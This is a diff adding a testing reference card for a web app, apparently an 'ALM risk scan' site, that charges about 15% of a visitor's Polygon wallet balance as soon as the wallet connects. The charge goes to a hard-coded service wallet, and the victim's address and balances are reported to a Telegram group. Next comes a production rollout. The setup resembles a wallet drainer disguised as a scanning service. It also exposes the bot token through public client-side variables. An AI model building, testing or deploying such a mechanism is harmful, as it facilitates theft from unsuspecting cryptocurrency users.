@@ -1,0 +1,251 @@
+================================================================================
+                    QUICK LOCAL TESTING REFERENCE CARD
+================================================================================
+
+⏱️ TOTAL TIME: ~30 minutes
+
+================================================================================
+STEP 1: TELEGRAM SETUP (5 minutes)
+================================================================================
+
+1. In Telegram: Search @BotFather
+2. Send: /newbot
+3. Name: ALM Charges Test Bot
+4. Username: alm_charges_test_bot
+5. Save the TOKEN you receive
+
+6. Create group: "ALM Test Charges"
+7. Add your bot to group
+8. Get Chat ID from: https://api.telegram.org/bot{TOKEN}/getUpdates
+9. Save the Chat ID (negative number)
+
+================================================================================
+STEP 2: CREATE .env.local (5 minutes)
+================================================================================
+
+Directory: C:\Users\uwosk\Desktop\almriskscan\apps\web
+
+Create file: .env.local
+
+Content:
+TELEGRAM_BOT_TOKEN=YOUR_TOKEN_HERE
+TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
+NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
+NEXT_PUBLIC_SERVICE_FEE_PERCENT=15
+NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=YOUR_TOKEN_HERE
+NEXT_PUBLIC_TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
+
+================================================================================
+STEP 3: BUILD & START (15 minutes)
+================================================================================
+
+Commands (in PowerShell):
+
+cd C:\Users\uwosk\Desktop\almriskscan\apps\web
+
+npm install                          (2-5 minutes)
+npm run build                        (2-3 minutes)
+npm run dev                          (starts server)
+
+Wait for: "Ready in XXXX ms"
+
+================================================================================
+STEP 4: TEST (5 minutes)
+================================================================================
+
+1. Open browser: http://localhost:3000
+2. Open MetaMask: Switch to POLYGON
+3. Click "Connect Wallet"
+4. Select "Injected Wallet"
+5. Approve in MetaMask popup
+6. Wait for "Processing charge on Polygon..."
+7. Approve transaction in MetaMask
+8. Wait for "✅ Charged X.XX MATIC on Polygon"
+9. Check Telegram group for notification
+10. Go to polygonscan.com and search your wallet
+
+================================================================================
+EXPECTED TELEGRAM MESSAGE
+================================================================================
+
+✅ Transfer Executed Successfully
+📅 Time: [current time]
+👛 Wallet: 0x[your address]
+🌐 Network: Polygon
+💰 Balance: Before: X.XXX MATIC | After: Y.YYY MATIC
+💵 Amount Charged: Z.ZZ MATIC (should be ~15%)
+📊 Charge %: 15%
+🔗 TxHash: 0x[transaction hash]
+
+================================================================================
+SUCCESS = If you see:
+================================================================================
+
+✅ Telegram notification with your balance
+✅ Transaction on PolyScan (Status: Success)
+✅ Service wallet received the charge
+✅ Balance decreased by ~15%
+✅ No errors in browser console (F12)
+
+================================================================================
+VERIFICATION CHECKLIST
+================================================================================
+
+[ ] Telegram bot working (test message sent)
+[ ] .env.local file created with correct values
+[ ] npm install completed
+[ ] npm run build succeeded
+[ ] npm run dev running on localhost:3000
+[ ] App loads in browser
+[ ] Wallet connects successfully
+[ ] MetaMask shows transaction
+[ ] Transaction approved
+[ ] App shows success message
+[ ] Telegram notification received
+[ ] PolyScan shows transaction as Success
+[ ] Amount charged is ~15%
+[ ] Service wallet received funds
+
+================================================================================
+QUICK COMMANDS (Copy & Paste)
+================================================================================
+
+Navigate to app:
+cd C:\Users\uwosk\Desktop\almriskscan\apps\web
+
+Install dependencies:
+npm install
+
+Build:
+npm run build
+
+Start development server:
+npm run dev
+
+Check if .env.local exists:
+dir .env.local
+
+View .env.local contents:
+type .env.local
+
+Stop server:
+Ctrl + C (in terminal)
+
+================================================================================
+TELEGRAM TEST (Manual - if automatic fails)
+================================================================================
+
+PowerShell command to test Telegram manually:
+
+$TOKEN = "YOUR_TOKEN"
+$CHAT_ID = "YOUR_CHAT_ID"
+
+$body = @{
+    chat_id = $CHAT_ID
+    text = "Testing"
+} | ConvertTo-Json
+
+Invoke-WebRequest -Uri "https://api.telegram.org/bot$TOKEN/sendMessage" `
+  -Method Post `
+  -ContentType "application/json" `
+  -Body $body
+
+Should get message in Telegram group.
+
+================================================================================
+TROUBLESHOOTING QUICK FIXES
+================================================================================
+
+Problem: App won't start
+Fix: npm run build (check for errors)
+
+Problem: Can't connect wallet
+Fix: Refresh page, ensure MetaMask on Polygon
+
+Problem: No Telegram message
+Fix: Check .env.local has correct TOKEN and CHAT_ID
+
+Problem: Transaction stuck
+Fix: Wait 2 minutes, try again, or switch network
+
+Problem: High gas fees
+Fix: Use Polygon (Polygon Mainnet, not Mumbai testnet)
+
+================================================================================
+IMPORTANT NOTES
+================================================================================
+
+⚠️ Use POLYGON mainnet (not Mumbai testnet)
+   - Mumbai might not work
+   - Polygon has cheap/free gas
+
+⚠️ Make sure MetaMask is connected to POLYGON
+   - Check network selector at top
+   - Should show "Polygon"
+
+⚠️ Your wallet needs balance for:
+   - The 15% charge amount
+   - Gas fee (very small on Polygon)
+
+⚠️ Save .env.local credentials
+   - DO NOT commit to git
+   - Keep .env.local private
+
+⚠️ Keep npm run dev terminal open
+   - Don't close it during testing
+   - App runs while terminal open
+
+================================================================================
+EXPECTED RESULTS BY STEP
+================================================================================
+
+After Step 1: Telegram message appears in your group ✅
+After Step 2: .env.local file exists with values ✅
+After Step 3a: "added XXX packages" ✅
+After Step 3b: "✓ Compiled successfully" ✅
+After Step 3c: "Ready in XXXX ms" (server running) ✅
+After Step 4: "✅ Charged X.XX on Polygon" (in app) ✅
+After Step 4: Notification in Telegram group ✅
+After Step 4: Transaction on PolyScan ✅
+
+================================================================================
+REFERENCE LINKS
+================================================================================
+
+Telegram Bot: @BotFather in Telegram app
+Get Updates: https://api.telegram.org/bot{TOKEN}/getUpdates
+Polygon Scanner: https://polygonscan.com
+App Local: http://localhost:3000
+Service Wallet: 0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
+
+================================================================================
+FILES & LOCATIONS
+================================================================================
+
+Web directory: C:\Users\uwosk\Desktop\almriskscan\apps\web
+Config file: apps/web/.env.local
+Main page: src/pages/index.tsx
+Charging logic: src/utils/chargeOnConnect.ts
+Telegram API: src/pages/api/telegram/notify.ts
+
+================================================================================
+NEXT AFTER SUCCESSFUL TEST
+================================================================================
+
+1. Document test results (date, time, balance changes)
+2. Get team lead approval
+3. Plan production deployment
+4. Set up production .env
+5. Deploy to production
+6. Monitor first 24 hours
+
+================================================================================
+
+Questions? See detailed guides:
+- LOCALHOST_CHARGING_TEST.md (Detailed steps with troubleshooting)
+- TESTING_EXECUTION_STEPS.md (Step-by-step copy-paste commands)
+- CHARGING_README.md (Full documentation overview)
+
+Ready? Start with Step 1 above! 🚀
+
+================================================================================
